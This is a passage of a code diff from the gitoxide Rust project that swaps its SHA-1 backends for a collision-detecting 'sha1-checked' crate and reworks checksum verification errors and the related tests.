0.40.0\",\n  \"gix-testtools\",\n  \"serde\",\n+ \"sha1-checked\",\n  \"thiserror 2.0.12\",\n ]\n\n@@ -4872,16 +4869,16 @@\ndependencies = [\n  \"cfg-if\",\n  \"cpufeatures\",\n  \"digest\",\n- \"sha1-asm\",\n ]\n \n [[package]]\n-name = \"sha1-asm\"\n-version = \"0.5.3\"\n+name = \"sha1-checked\"\n+version = \"0.10.0\"\n source = \"registry+https://github.com/rust-lang/crates.io-index\"\n-checksum = \"286acebaf8b67c1130aedffad26f594eff0c1292389158135327d2e23aed582b\"\n+checksum = \"89f599ac0c323ebb1c6082821a54962b839832b03984598375bff3975b804423\"\n dependencies = [\n- \"cc\",\n+ \"digest\",\n+ \"sha1\",\n ]\n \n [[package]]\n```\n\nFilename: Cargo.toml:\n```\n@@ -45,7 +45,7 @@\nmax = [\"max-control\", \"fast\", \"gitoxide-core-tools-query\", \"gitoxide-core-tools-\n ## transports as it uses Rust's HTTP implementation.\n ##\n ## As fast as possible, with TUI progress, progress line rendering with auto-configuration, all transports available but less mature pure Rust HTTP implementation, all `ein` tools, CLI colors and local-time support, JSON output, regex support for rev-specs.\n-max-pure = [\"max-control\", \"gix-features/rustsha1\", \"gix-features/zlib-rust-backend\", \"http-client-reqwest\", \"gitoxide-core-blocking-client\"]\n+max-pure = [\"max-control\", \"gix-features/zlib-rust-backend\", \"http-client-reqwest\", \"gitoxide-core-blocking-client\"]\n \n ## Like `max`, but with more control for configuration. See the *Package Maintainers* headline for more information.\n max-control = [\"tracing\", \"fast-safe\", \"pretty-cli\", \"gitoxide-core-tools\", \"prodash-render-line\", \"prodash-render-tui\", \"prodash/render-line-autoconfigure\", \"gix/revparse-regex\"]\n\n@@ -60,7 +60,7 @@\nlean = [\"fast\", \"tracing\", \"pretty-cli\", \"http-client-curl\", \"gitoxide-core-tool\n ## This build is essentially limited to local operations without any fanciness.\n ##\n ## Optimized for size, no parallelism thus much slower, progress line rendering.\n-small = [\"pretty-cli\", \"gix-features/rustsha1\", \"gix-features/zlib-rust-backend\", \"prodash-render-line\", \"is-terminal\"]\n+small = [\"pretty-cli\", \"gix-features/zlib-rust-backend\", \"prodash-render-line\", \"is-terminal\"]\n \n ## Like lean, but uses Rusts async implementations for networking.\n ##\n\n@@ -74,7 +74,7 @@\nsmall = [\"pretty-cli\", \"gix-features/rustsha1\", \"gix-features/zlib-rust-backend\"\n lean-async = [\"fast\", \"tracing\", \"pretty-cli\", \"gitoxide-core-tools\", \"gitoxide-core-tools-query\", \"gitoxide-core-tools-corpus\", \"gitoxide-core-async-client\", \"prodash-render-line\"]\n \n #! ### Package Maintainers\n-#! `*-control` features leave it to you to configure C libraries, involving choices for `zlib`, ! hashing and transport implementation.\n+#! `*-control` features leave it to you to configure C libraries, involving choices for `zlib` and transport implementation.\n #!\n #! Additional features *can* be provided with `--features` and are handled by the [`gix-features` crate](https://docs.rs/gix-features/latest).\n #! If nothing else is specified, the Rust implementation is used. ! Note that only one feature of each section can be enabled at a time.\n\n@@ -84,28 +84,25 @@\nlean-async = [\"fast\", \"tracing\", \"pretty-cli\", \"gitoxide-core-tools\", \"gitoxide-\n #!     - `gix-features/zlib-ng-compat`\n #!     - `gix-features/zlib-stock`\n #!     - `gix-features/zlib-rust-backend` (*default if no choice is made*)\n-#! * **sha1**\n-#!     - `gix-features/fast-sha1`\n-#!     - `gix-features/rustsha1` (*default if no choice is made*)\n #! * **HTTP** - see the *Building Blocks for mutually exclusive networking* headline\n #!\n #! #### Examples\n #!\n #! * `cargo build --release --no-default-features --features max-control,gix-features/zlib-stock,gitoxide-core-blocking-client,http-client-curl`\n #!     - Create a build just like `max`, but using the stock `zlib` library instead of `zlib-ng`\n-#! * `cargo build --release --no-default-features --features max-control,http-client-reqwest,gitoxide-core-blocking-client,gix-features/fast-sha1`\n-#!     - Create a build just like `max-pure`, but with faster hashing due to `fast-sha1`.\n+#! * `cargo build --release --no-default-features --features max-control,http-client-reqwest,gitoxide-core-blocking-client,gix-features/zlib-ng`\n+#!     - Create a build just like `max-pure`, but with faster compression due to `zlib-ng`.\n \n #! ### Building Blocks\n #! Typical combinations of features of our dependencies, some of which are referred to in the `gitoxide` crate's code for conditional compilation.\n \n ## Makes the crate execute as fast as possible by supporting parallel computation of otherwise long-running functions\n-## as well as fast, hardware accelerated hashing, along with a faster zlib backend.\n+## as well as a faster zlib backend.\n ## If disabled, the binary will be visibly smaller.\n fast = [\"gix/max-performance\", \"gix/comfort\"]\n \n ## Makes the crate execute as fast as possible by supporting parallel computation of otherwise long-running functions\n-## as well as fast, hardware accelerated hashing, along with a faster zlib backend.\n+## as well as a faster zlib backend.\n ## If disabled, the binary will be visibly smaller.\n fast-safe = [\"gix/max-performance-safe\", \"gix/comfort\"]\n\n@@ -205,8 +202,7 @@\ngix-hash = { opt-level = 3 }\n gix-actor = { opt-level = 3 }\n gix-config = { opt-level = 3 }\n miniz_oxide = { opt-level = 3 }\n-sha1 = { opt-level = 3 }\n-sha1_smol = { opt-level = 3 }\n+sha1-checked = { opt-level = 3 }\n \n [profile.release]\n overflow-checks = false\n```\n\nFilename: SHORTCOMINGS.md:\n```\n@@ -35,7 +35,3 @@\nThis file is for tracking features that are less well implemented or less powerf\n * **gix-url** _might_ be more restrictive than what git allows as for the most part, it uses a browser grade URL parser.\n     * Thus far there is no proof for this, and as _potential remedy_ we could certainly re-implement exactly what git does\n       to handle its URLs.\n-\n-### `gix-features`\n-\n-* **sha1** isn't hardened (i.e. doesn't have collision detection). Needs [to be contributed](https://github.com/GitoxideLabs/gitoxide/issues/585).\n```\n\nFilename: crate-status.md:\n```\n@@ -894,8 +894,6 @@\nSee its [README.md](https://github.com/GitoxideLabs/gitoxide/blob/main/gix-lock/\n         * `in_parallel`\n         * `join`\n     * _When off all functions execute serially_\n-* **fast-sha1**\n-    * provides a faster SHA1 implementation using CPU intrinsics\n * [x] API documentation\n \n ### gix-tui\n```\n\nFilename: gitoxide-core/src/pack/explode.rs:\n```\n@@ -78,11 +78,11 @@\nenum Error {\n     },\n     #[error(\"Object didn't verify after right after writing it\")]\n     Verify(#[from] objs::data::verify::Error),\n-    #[error(\"{kind} object {expected} wasn't re-encoded without change - new hash is {actual}\")]\n+    #[error(\"{kind} object wasn't re-encoded without change\")]\n     ObjectEncodeMismatch {\n+        #[source]\n+        source: gix::hash::verify::Error,\n         kind: object::Kind,\n-        actual: ObjectId,\n-        expected: ObjectId,\n     },\n     #[error(\"The recently written file for loose object {id} could not be found\")]\n     WrittenFileMissing { id: ObjectId },\n\n@@ -201,17 +201,16 @@\npub fn pack_or_pack_index(\n                         kind: object_kind,\n                         id: index_entry.oid,\n                     })?;\n-                    if written_id != index_entry.oid {\n+                    if let Err(err) = written_id.verify(&index_entry.oid) {\n                         if let object::Kind::Tree = object_kind {\n                             progress.info(format!(\n                                 \"The tree in pack named {} was written as {} due to modes 100664 and 100640 rewritten as 100644.\",\n                                 index_entry.oid, written_id\n                             ));\n                         } else {\n                             return Err(Error::ObjectEncodeMismatch {\n+                                source: err,\n                                 kind: object_kind,\n-                                actual: index_entry.oid,\n-                                expected: written_id,\n                             });\n                         }\n                     }\n```\n\nFilename: gix-commitgraph/Cargo.toml:\n```\n@@ -20,7 +20,6 @@\ndoctest = false\n serde = [\"dep:serde\", \"gix-hash/serde\", \"bstr/serde\"]\n \n [dependencies]\n-gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\"rustsha1\"] }\n gix-hash = { version = \"^0.16.0\", path = \"../gix-hash\" }\n gix-chunk = { version = \"^0.4.11\", path = \"../gix-chunk\" }\n```\n\nFilename: gix-commitgraph/src/file/verify.rs:\n```\n@@ -28,11 +28,8 @@\npub enum Error<E: std::error::Error + 'static> {\n     Filename(String),\n     #[error(\"commit {id} has invalid generation {generation}\")]\n     Generation { generation: u32, id: gix_hash::ObjectId },\n-    #[error(\"checksum mismatch: expected {expected}, got {actual}\")]\n-    Mismatch {\n-        actual: gix_hash::ObjectId,\n-        expected: gix_hash::ObjectId,\n-    },\n+    #[error(transparent)]\n+    Checksum(#[from] checksum::Error),\n     #[error(\"{0}\")]\n     Processor(#[source] E),\n     #[error(\"commit {id} has invalid root tree ID {root_tree_id}\")]\n\n@@ -42,6 +39,19 @@\npub enum Error<E: std::error::Error + 'static> {\n     },\n }\n \n+///\n+pub mod checksum {\n+    /// The error used in [`super::File::verify_checksum()`].\n+    #[derive(thiserror::Error, Debug)]\n+    #[allow(missing_docs)]\n+    pub enum Error {\n+        #[error(\"failed to hash commit graph file\")]\n+        Hasher(#[from] gix_hash::hasher::Error),\n+        #[error(transparent)]\n+        Verify(#[from] gix_hash::verify::Error),\n+    }\n+}\n+\n /// The positive result of [`File::traverse()`] providing some statistical information.\n #[derive(Clone, Debug, Eq, PartialEq)]\n #[cfg_attr(feature = \"serde\", derive(serde::Deserialize, serde::Serialize))]\n\n@@ -73,8 +83,7 @@\nimpl File {\n         E: std::error::Error + 'static,\n         Processor: FnMut(&file::Commit<'a>) -> Result<(), E>,\n     {\n-        self.verify_checksum()\n-            .map_err(|(actual, expected)| Error::Mismatch { actual, expected })?;\n+        self.verify_checksum()?;\n         verify_split_chain_filename_hash(&self.path, self.checksum()).map_err(Error::Filename)?;\n \n         let null_id = self.object_hash().null_ref();\n\n@@ -138,23 +147,18 @@\nimpl File {\n     /// Assure the [`checksum`][File::checksum()] matches the actual checksum over all content of this file, excluding the trailing\n     /// checksum itself.\n     ///\n-    /// Return the actual checksum on success or `(actual checksum, expected checksum)` if there is a mismatch.\n-    pub fn verify_checksum(&self) -> Result<gix_hash::ObjectId, (gix_hash::ObjectId, gix_hash::ObjectId)> {\n-        // Even though we could use gix_features::hash::bytes_of_file(\u2026), this would require using our own\n-        // Error type to support io::Error and Mismatch. As we only gain progress, there probably isn't much value\n+    /// Return the actual checksum on success or [`checksum::Error`] if there is a mismatch.\n+    pub fn verify_checksum(&self) -> Result<gix_hash::ObjectId, checksum::Error> {\n+        // Even though we could use gix_hash::bytes_of_file(\u2026), this would require extending our\n+        // Error type to support io::Error. As we only gain progress, there probably isn't much value\n         // as these files are usually small enough to process them in less than a second, even for the large ones.\n         // But it's possible, once a progress instance is passed.\n         let data_len_without_trailer = self.data.len() - self.hash_len;\n-        let mut hasher = gix_features::hash::hasher(self.object_hash());\n+        let mut hasher = gix_hash::hasher(self.object_hash());\n         hasher.update(&self.data[..data_len_without_trailer]);\n-        let actual = gix_hash::ObjectId::from_bytes_or_panic(hasher.digest().as_ref());\n-\n-        let expected = self.checksum();\n-        if actual == expected {\n-            Ok(actual)\n-        } else {\n-            Err((actual, expected.into()))\n-        }\n+        let actual = hasher.try_finalize()?;\n+        actual.verify(self.checksum())?;\n+        Ok(actual)\n     }\n }\n```\n\nFilename: gix-commitgraph/src/verify.rs:\n```\n@@ -164,9 +164,7 @@\nimpl Graph {\n                         file::verify::Error::RootTreeId { id, root_tree_id } => {\n                             file::verify::Error::RootTreeId { id, root_tree_id }\n                         }\n-                        file::verify::Error::Mismatch { actual, expected } => {\n-                            file::verify::Error::Mismatch { actual, expected }\n-                        }\n+                        file::verify::Error::Checksum(err) => file::verify::Error::Checksum(err),\n                         file::verify::Error::Generation { generation, id } => {\n                             file::verify::Error::Generation { generation, id }\n                         }\n```\n\nFilename: gix-diff/tests/diff/blob/pipeline.rs:\n```\n@@ -72,7 +72,7 @@\npub(crate) mod convert_to_diffable {\n \n             let mut db = ObjectDb::default();\n             let b_content = \"b-content\";\n-            let id = db.insert(b_content);\n+            let id = db.insert(b_content)?;\n \n             let out = filter.convert_to_diffable(\n                 &id,\n\n@@ -129,7 +129,7 @@\npub(crate) mod convert_to_diffable {\n         assert_eq!(buf.len(), 0, \"it should avoid querying that data in the first place\");\n \n         let mut db = ObjectDb::default();\n-        let id = db.insert(large_content);\n+        let id = db.insert(large_content)?;\n         let out = filter.convert_to_diffable(\n             &id,\n             EntryKind::Blob,\n\n@@ -211,7 +211,7 @@\npub(crate) mod convert_to_diffable {\n         drop(tmp);\n \n         let mut db = ObjectDb::default();\n-        let id = db.insert(large_content);\n+        let id = db.insert(large_content)?;\n \n         let out = filter.convert_to_diffable(\n             &id,\n\n@@ -397,7 +397,7 @@\npub(crate) mod convert_to_diffable {\n \n         let mut db = ObjectDb::default();\n         let b_content = \"b-content\\n\";\n-        let id = db.insert(b_content);\n+        let id = db.insert(b_content)?;\n \n         let out = filter.convert_to_diffable(\n             &id,\n\n@@ -416,7 +416,7 @@\npub(crate) mod convert_to_diffable {\n \n         let mut db = ObjectDb::default();\n         let b_content = \"b\\n\";\n-        let id = db.insert(b_content);\n+        let id = db.insert(b_content)?;\n         let out = filter.convert_to_diffable(\n             &id,\n             EntryKind::Blob,\n\n@@ -490,7 +490,7 @@\npub(crate) mod convert_to_diffable {\n \n         let mut db = ObjectDb::default();\n         let b_content = \"b-co\\0ntent\\n\";\n-        let id = db.insert(b_content);\n+        let id = db.insert(b_content)?;\n \n         let out = filter.convert_to_diffable(\n             &id,\n\n@@ -509,7 +509,7 @@\npub(crate) mod convert_to_diffable {\n \n         let platform = attributes.at_entry(\"c\", None, &gix_object::find::Never)?;\n \n-        let id = db.insert(\"b\");\n+        let id = db.insert(\"b\")?;\n         let out = filter.convert_to_diffable(\n             &id,\n             EntryKind::Blob,\n\n@@ -638,7 +638,7 @@\npub(crate) mod convert_to_diffable {\n         assert_eq!(out.data, Some(pipeline::Data::Buffer { is_derived: false }));\n         assert_eq!(buf.as_bstr(), \"a\\n\", \"unconditionally use git according to mode\");\n \n-        let id = db.insert(\"a\\n\");\n+        let id = db.insert(\"a\\n\")?;\n         for mode in worktree_modes {\n             let out = filter.convert_to_diffable(\n                 &id,\n\n@@ -714,7 +714,7 @@\npub(crate) mod convert_to_diffable {\n             assert_eq!(buf.len(), 0, \"always cleared\");\n \n             buf.push(1);\n-            let id = db.insert(\"link-target\");\n+            let id = db.insert(\"link-target\")?;\n             let out = filter.convert_to_diffable(\n                 &id,\n                 EntryKind::Link,\n\n@@ -761,7 +761,7 @@\npub(crate) mod convert_to_diffable {\n             assert_eq!(buf.len(), 0, \"it's always cleared before any potential use\");\n         }\n \n-        let id = db.insert(\"b\\n\");\n+        let id = db.insert(\"b\\n\")?;\n         for mode in all_modes {\n             buf.push(1);\n             let out = filter.convert_to_diffable(\n\n@@ -814,7 +814,7 @@\npub(crate) mod convert_to_diffable {\n             );\n         }\n \n-        let id = db.insert(\"c\\n\");\n+        let id = db.insert(\"c\\n\")?;\n         for mode in worktree_modes {\n             let out = filter.convert_to_diffable(\n                 &id,\n\n@@ -863,7 +863,7 @@\npub(crate) mod convert_to_diffable {\n             assert_eq!(buf.len(), 0);\n         }\n \n-        let id = db.insert(\"unset\\n\");\n+        let id = db.insert(\"unset\\n\")?;\n         for mode in all_modes {\n             let out = filter.convert_to_diffable(\n                 &id,\n\n@@ -890,7 +890,7 @@\npub(crate) mod convert_to_diffable {\n         }\n \n         let platform = attributes.at_entry(\"d\", None, &gix_object::find::Never)?;\n-        let id = db.insert(\"d-in-db\");\n+        let id = db.insert(\"d-in-db\")?;\n         for mode in worktree_modes {\n             let out = filter.convert_to_diffable(\n                 &null,\n\n@@ -959,7 +959,7 @@\npub(crate) mod convert_to_diffable {\n             \"no text filter, so git conversion was applied for worktree source\"\n         );\n \n-        let id = db.insert(\"e-in-db\");\n+        let id = db.insert(\"e-in-db\")?;\n         let out = filter.convert_to_diffable(\n             &id,\n             EntryKind::Blob,\n```\n\nFilename: gix-diff/tests/diff/blob/platform.rs:\n```\n@@ -30,7 +30,7 @@\nfn resources_of_worktree_and_odb_and_check_link() -> crate::Result {\n \n     let mut db = ObjectDb::default();\n     let a_content = \"a-content\";\n-    let id = db.insert(a_content);\n+    let id = db.insert(a_content)?;\n     platform.set_resource(\n         id,\n         EntryKind::BlobExecutable,\n\n@@ -194,7 +194,7 @@\nfn diff_binary() -> crate::Result {\n \n     let mut db = ObjectDb::default();\n     let a_content = \"b\";\n-    let id = db.insert(a_content);\n+    let id = db.insert(a_content)?;\n     platform.set_resource(id, EntryKind::Blob, \"b\".into(), ResourceKind::NewOrDestination, &db)?;\n \n     let out = platform.prepare_diff()?;\n\n@@ -235,7 +235,7 @@\nfn diff_performed_despite_external_command() -> crate::Result {\n \n     let mut db = ObjectDb::default();\n     let a_content = \"b\";\n-    let id = db.insert(a_content);\n+    let id = db.insert(a_content)?;\n     platform.set_resource(id, EntryKind::Blob, \"b\".into(), ResourceKind::NewOrDestination, &db)?;\n \n     let out = platform.prepare_diff()?;\n\n@@ -277,7 +277,7 @@\nfn diff_skipped_due_to_external_command_and_enabled_option() -> crate::Result {\n \n     let mut db = ObjectDb::default();\n     let a_content = \"b\";\n-    let id = db.insert(a_content);\n+    let id = db.insert(a_content)?;\n     platform.set_resource(id, EntryKind::Blob, \"b\".into(), ResourceKind::NewOrDestination, &db)?;\n \n     let out = platform.prepare_diff()?;\n```\n\nFilename: gix-diff/tests/diff/main.rs:\n```\n@@ -51,10 +51,10 @@\nmod util {\n \n     impl ObjectDb {\n         /// Insert `data` and return its hash. That can be used to find it again.\n-        pub fn insert(&mut self, data: &str) -> gix_hash::ObjectId {\n-            let id = gix_object::compute_hash(gix_hash::Kind::Sha1, gix_object::Kind::Blob, data.as_bytes());\n+        pub fn insert(&mut self, data: &str) -> Result<gix_hash::ObjectId, Error> {\n+            let id = gix_object::compute_hash(gix_hash::Kind::Sha1, gix_object::Kind::Blob, data.as_bytes())?;\n             self.data_by_id.insert(id, data.into());\n-            id\n+            Ok(id)\n         }\n     }\n }\n```\n\nFilename: gix-diff/tests/diff/rewrites/tracker.rs:\n```\n@@ -92,7 +92,7 @@\nfn copy_by_similarity_reports_limit_if_encountered() -> crate::Result {\n             (Change::addition(), \"a-cpy-2\", \"a\"),\n             (Change::modification(), \"d\", \"ab\"),\n         ],\n-    );\n+    )?;\n \n     let mut calls = 0;\n     let out = util::assert_emit_with_objects(\n\n@@ -145,7 +145,7 @@\nfn copy_by_id() -> crate::Result {\n                 (Change::addition(), \"a-cpy-2\", \"a\"),\n                 (Change::modification(), \"d\", \"a\"),\n             ],\n-        );\n+        )?;\n \n         let mut calls = 0;\n         let out = util::assert_emit_with_objects(\n\n@@ -218,7 +218,7 @@\nfn copy_by_id_search_in_all_sources() -> crate::Result {\n                 (Change::addition(), \"a-cpy-1\", \"a\"),\n                 (Change::addition(), \"a-cpy-2\", \"a\"),\n             ],\n-        );\n+        )?;\n \n         let mut calls = 0;\n         let content_id = hex_to_id(\"2e65efe2a145dda7ee51d1741299f848e5bf752e\");\n\n@@ -299,7 +299,7 @@\nfn copy_by_50_percent_similarity() -> crate::Result {\n             (Change::addition(), \"a-cpy-2\", \"a\\nc\"),\n             (Change::modification(), \"d\", \"a\"),\n         ],\n-    );\n+    )?;\n \n     let mut calls = 0;\n     let out = util::assert_emit_with_objects(\n\n@@ -377,7 +377,7 @@\nfn copy_by_id_in_additions_only() -> crate::Result {\n             (Change::modification(), \"a\", \"a\"),\n             (Change::modification(), \"a-cpy-1\", \"a\"),\n         ],\n-    );\n+    )?;\n \n     let mut calls = 0;\n     let out = util::assert_emit_with_objects(\n\n@@ -429,7 +429,7 @@\nfn rename_by_similarity_reports_limit_if_encountered() -> crate::Result {\n             (Change::addition(), \"b\", \"firt\\nsecond\\n\"),\n             (Change::addition(), \"c\", \"second\\nunrelated\\n\"),\n         ],\n-    );\n+    )?;\n \n     let mut calls = 0;\n     let out = util::assert_emit_with_objects(\n\n@@ -475,7 +475,7 @@\nfn rename_by_50_percent_similarity() -> crate::Result {\n             (Change::addition(), \"b\", \"firt\\nsecond\\n\"),\n             (Change::addition(), \"c\", \"second\\nunrelated\\n\"),\n         ],\n-    );\n+    )?;\n \n     let mut calls = 0;\n     let out = util::assert_emit_with_objects(\n\n@@ -596,7 +596,7 @@\nfn directory_renames_by_id_can_fail_gracefully() -> crate::Result {\n             (Change::deletion(), \"a\", \"first\\nsecond\\n\"),\n             (Change::addition(), \"b\", \"firt\\nsecond\\n\"),\n         ],\n-    );\n+    )?;\n \n     let mut calls = 0;\n     let out = util::assert_emit_with_objects(\n\n@@ -803,16 +803,16 @@\nmod util {\n     pub fn add_retained_blobs<'a>(\n         tracker: &mut rewrites::Tracker<Change>,\n         blobs: impl IntoIterator<Item = (Change, &'a str, &'a str)>,\n-    ) -> ObjectDb {\n+    ) -> crate::Result<ObjectDb> {\n         let mut db = ObjectDb::default();\n         for (mut change, location, data) in blobs {\n-            change.id = db.insert(data);\n+            change.id = db.insert(data)?;\n             assert!(\n                 tracker.try_push_change(change, location.into()).is_none(),\n                 \"input changes must be tracked\"\n             );\n         }\n-        db\n+        Ok(db)\n     }\n \n     pub fn assert_emit(\n```\n\nFilename: gix-features/Cargo.toml:\n```\n@@ -77,48 +77,32 @@\nzlib-stock = [\"zlib\", \"flate2?/zlib\"]\n ## may build in environments where other backends don't.\n zlib-rust-backend = [\"zlib\", \"flate2?/rust_backend\"]\n \n-#! ### Mutually Exclusive SHA1\n-## A fast SHA1 implementation is critical to `gitoxide's` object database performance\n-## A multi-crate implementation that can use hardware acceleration, thus bearing the potential for up to 2Gb/s throughput on\n-## CPUs that support it, like AMD Ryzen or Intel Core i3, as well as Apple Silicon like M1.\n-## Takes precedence over `rustsha1` if both are specified.\n-fast-sha1 = [\"dep:sha1\"]\n-## A standard and well performing pure Rust implementation of Sha1. Will significantly slow down various git operations.\n-rustsha1 = [\"dep:sha1_smol\"]\n-\n #! ### Other\n \n ## Count cache hits and misses and print that debug information on drop.\n ## Caches implement this by default, which costs nothing unless this feature is enabled\n cache-efficiency-debug = []\n \n-[[test]]\n-name = \"hash\"\n-path = \"tests/hash.rs\"\n-required-features = [\"rustsha1\"]\n-\n [[test]]\n name = \"parallel\"\n path = \"tests/parallel_threaded.rs\"\n-required-features = [\"parallel\", \"rustsha1\"]\n+required-features = [\"parallel\"]\n \n [[test]]\n name = \"multi-threaded\"\n path = \"tests/parallel_shared_threaded.rs\"\n-required-features = [\"parallel\", \"rustsha1\"]\n+required-features = [\"parallel\"]\n \n [[test]]\n name = \"single-threaded\"\n path = \"tests/parallel_shared.rs\"\n-required-features = [\"rustsha1\"]\n \n [[test]]\n name = \"pipe\"\n path = \"tests/pipe.rs\"\n required-features = [\"io-pipe\"]\n \n [dependencies]\n-gix-hash = { version = \"^0.16.0\", path = \"../gix-hash\" }\n gix-trace = { version = \"^0.1.12\", path = \"../gix-trace\" }\n \n # for walkdir\n\n@@ -130,10 +114,8 @@\nparking_lot = { version = \"0.12.0\", default-features = false, optional = true }\n \n walkdir = { version = \"2.3.2\", optional = true } # used when parallel is off\n \n-# hashing and 'fast-sha1' feature\n-sha1_smol = { version = \"1.0.0\", optional = true }\n+# hashing\n crc32fast = { version = \"1.2.1\", optional = true }\n-sha1 = { version = \"0.10.0\", optional = true }\n \n # progress\n prodash = { version = \"29.0.1\", optional = true }\n\n@@ -156,12 +138,6 @@\nlibc = { version = \"0.2.119\" }\n [dev-dependencies]\n bstr = { version = \"1.3.0\", default-features = false }\n \n-\n-# Assembly doesn't yet compile on MSVC on windows, but does on GNU, see https://github.com/RustCrypto/asm-hashes/issues/17\n-# At this time, only aarch64, x86 and x86_64 are supported.\n-[target.'cfg(all(any(target_arch = \"aarch64\", target_arch = \"x86\", target_arch = \"x86_64\"), not(target_os = \"windows\")))'.dependencies]\n-sha1 = { version = \"0.10.0\", optional = true, features = [\"asm\"] }\n-\n [package.metadata.docs.rs]\n all-features = true\n features = [\"document-features\"]\n```\n\nFilename: gix-features/src/hash.rs:\n```\n@@ -1,60 +1,10 @@\n//! Hash functions and hash utilities\n-//!\n-//! With the `fast-sha1` feature, the `Sha1` hash type will use a more elaborate implementation utilizing hardware support\n-//! in case it is available. Otherwise the `rustsha1` feature should be set. `fast-sha1` will take precedence.\n-//! Otherwise, a minimal yet performant implementation is used instead for a decent trade-off between compile times and run-time performance.\n-#[cfg(all(feature = \"rustsha1\", not(feature = \"fast-sha1\")))]\n-mod _impl {\n-    use super::Digest;\n-\n-    /// A implementation of the Sha1 hash, which can be used once.\n-    #[derive(Default, Clone)]\n-    pub struct Sha1(sha1_smol::Sha1);\n-\n-    impl Sha1 {\n-        /// Digest the given `bytes`.\n-        pub fn update(&mut self, bytes: &[u8]) {\n-            self.0.update(bytes);\n-        }\n-        /// Finalize the hash and produce a digest.\n-        pub fn digest(self) -> Digest {\n-            self.0.digest().bytes()\n-        }\n-    }\n-}\n-\n-/// A hash-digest produced by a [`Hasher`] hash implementation.\n-#[cfg(any(feature = \"fast-sha1\", feature = \"rustsha1\"))]\n-pub type Digest = [u8; 20];\n-\n-#[cfg(feature = \"fast-sha1\")]\n-mod _impl {\n-    use sha1::Digest;\n-\n-    /// A implementation of the Sha1 hash, which can be used once.\n-    #[derive(Default, Clone)]\n-    pub struct Sha1(sha1::Sha1);\n-\n-    impl Sha1 {\n-        /// Digest the given `bytes`.\n-        pub fn update(&mut self, bytes: &[u8]) {\n-            self.0.update(bytes);\n-        }\n-        /// Finalize the hash and produce a digest.\n-        pub fn digest(self) -> super::Digest {\n-            self.0.finalize().into()\n-        }\n-    }\n-}\n-\n-#[cfg(any(feature = \"rustsha1\", feature = \"fast-sha1\"))]\n-pub use _impl::Sha1 as Hasher;\n \n /// Compute a CRC32 hash from the given `bytes`, returning the CRC32 hash.\n ///\n-/// When calling this function for the first time, `previous_value` should be `0`. Otherwise it\n-/// should be the previous return value of this function to provide a hash of multiple sequential\n-/// chunks of `bytes`.\n+/// When calling this function for the first time, `previous_value` should be `0`.\n+/// Otherwise, it should be the previous return value of this function to provide a hash\n+/// of multiple sequential chunks of `bytes`.\n #[cfg(feature = \"crc32\")]\n pub fn crc32_update(previous_value: u32, bytes: &[u8]) -> u32 {\n     let mut h = crc32fast::Hasher::new_with_initial(previous_value);\n\n@@ -71,132 +21,3 @@\npub fn crc32(bytes: &[u8]) -> u32 {\n     h.update(bytes);\n     h.finalize()\n }\n-\n-/// Produce a hasher suitable for the given kind of hash.\n-#[cfg(any(feature = \"rustsha1\", feature = \"fast-sha1\"))]\n-pub fn hasher(kind: gix_hash::Kind) -> Hasher {\n-    match kind {\n-        gix_hash::Kind::Sha1 => Hasher::default(),\n-    }\n-}\n-\n-/// Compute the hash of `kind` for the bytes in the file at `path`, hashing only the first `num_bytes_from_start`\n-/// while initializing and calling `progress`.\n-///\n-/// `num_bytes_from_start` is useful to avoid reading trailing hashes, which are never part of the hash itself,\n-/// denoting the amount of bytes to hash starting from the beginning of the file.\n-///\n-/// # Note\n-///\n-/// * Only available with the `gix-object` feature enabled due to usage of the [`gix_hash::Kind`] enum and the\n-///   [`gix_hash::ObjectId`] return value.\n-/// * [Interrupts][crate::interrupt] are supported.\n-#[cfg(all(feature = \"progress\", any(feature = \"rustsha1\", feature = \"fast-sha1\")))]\n-pub fn bytes_of_file(\n-    path: &std::path::Path,\n-    num_bytes_from_start: u64,\n-    kind: gix_hash::Kind,\n-    progress: &mut dyn crate::progress::Progress,\n-    should_interrupt: &std::sync::atomic::AtomicBool,\n-) -> std::io::Result<gix_hash::ObjectId> {\n-    bytes(\n-        &mut std::fs::File::open(path)?,\n-        num_bytes_from_start,\n-        kind,\n-        progress,\n-        should_interrupt,\n-    )\n-}\n-\n-/// Similar to [`bytes_of_file`], but operates on a stream of bytes.\n-#[cfg(all(feature = \"progress\", any(feature = \"rustsha1\", feature = \"fast-sha1\")))]\n-pub fn bytes(\n-    read: &mut dyn std::io::Read,\n-    num_bytes_from_start: u64,\n-    kind: gix_hash::Kind,\n-    progress: &mut dyn crate::progress::Progress,\n-    should_interrupt: &std::sync::atomic::AtomicBool,\n-) -> std::io::Result<gix_hash::ObjectId> {\n-    bytes_with_hasher(read, num_bytes_from_start, hasher(kind), progress, should_interrupt)\n-}\n-\n-/// Similar to [`bytes()`], but takes a `hasher` instead of a hash kind.\n-#[cfg(all(feature = \"progress\", any(feature = \"rustsha1\", feature = \"fast-sha1\")))]\n-pub fn bytes_with_hasher(\n-    read: &mut dyn std::io::Read,\n-    num_bytes_from_start: u64,\n-    mut hasher: Hasher,\n-    progress: &mut dyn crate::progress::Progress,\n-    should_interrupt: &std::sync::atomic::AtomicBool,\n-) -> std::io::Result<gix_hash::ObjectId> {\n-    let start = std::time::Instant::now();\n-    // init progress before the possibility for failure, as convenience in case people want to recover\n-    progress.init(\n-        Some(num_bytes_from_start as prodash::progress::Step),\n-        crate::progress::bytes(),\n-    );\n-\n-    const BUF_SIZE: usize = u16::MAX as usize;\n-    let mut buf = [0u8; BUF_SIZE];\n-    let mut bytes_left = num_bytes_from_start;\n-\n-    while bytes_left > 0 {\n-        let out = &mut buf[..BUF_SIZE.min(bytes_left as usize)];\n-        read.read_exact(out)?;\n-        bytes_left -= out.len() as u64;\n-        progress.inc_by(out.len());\n-        hasher.update(out);\n-        if should_interrupt.load(std::sync::atomic::Ordering::SeqCst) {\n-            return Err(std::io::Error::new(std::io::ErrorKind::Other, \"Interrupted\"));\n-        }\n-    }\n-\n-    let id = gix_hash::ObjectId::from(hasher.digest());\n-    progress.show_throughput(start);\n-    Ok(id)\n-}\n-\n-#[cfg(any(feature = \"rustsha1\", feature = \"fast-sha1\"))]\n-mod write {\n-    use crate::hash::Hasher;\n-\n-    /// A utility to automatically generate a hash while writing into an inner writer.\n-    pub struct Write<T> {\n-        /// The hash implementation.\n-        pub hash: Hasher,\n-        /// The inner writer.\n-        pub inner: T,\n-    }\n-\n-    impl<T> std::io::Write for Write<T>\n-    where\n-        T: std::io::Write,\n-    {\n-        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {\n-            let written = self.inner.write(buf)?;\n-            self.hash.update(&buf[..written]);\n-            